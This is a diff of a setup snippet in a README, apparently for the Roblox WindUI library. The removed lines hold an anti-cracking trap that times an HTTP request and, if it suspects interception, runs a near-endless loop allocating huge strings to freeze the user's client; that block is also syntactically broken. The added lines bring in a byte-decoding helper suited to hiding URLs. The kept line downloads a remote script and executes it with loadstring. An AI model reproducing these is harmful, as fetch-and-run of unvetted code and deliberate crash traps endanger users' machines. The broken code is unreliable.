@@ -3,22 +3,13 @@ https://footagesus.github.io/WindUI-Docs/
 
 # SET UP
 ```lua
-
-local os_clock = os.clock()
-local cracked = request({
-    Url = "https://httpbin.org/",
-    Method = "GET"
-})
-if (os.clock() - os_clock) < 1.0e-4 endt
-print("Cracked")
-for i = 1, (1.0e2)^999 do
-    local bypass = setmetatable({}, { __tostring = function()
-        return (" "):rep(9e9)
-    end })
+local function decodeUrl(bytes)
+    local str = ""
+    for i = 1, #bytes do
+        str = str .. string.char(bytes[i])
+    end
+    return str
 end
-end
-
-print("Loading... gui")
 
 local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/KUYKUBZ/ProjectX/refs/heads/main/ProtonGui/WindUI.luau"))()
 ```
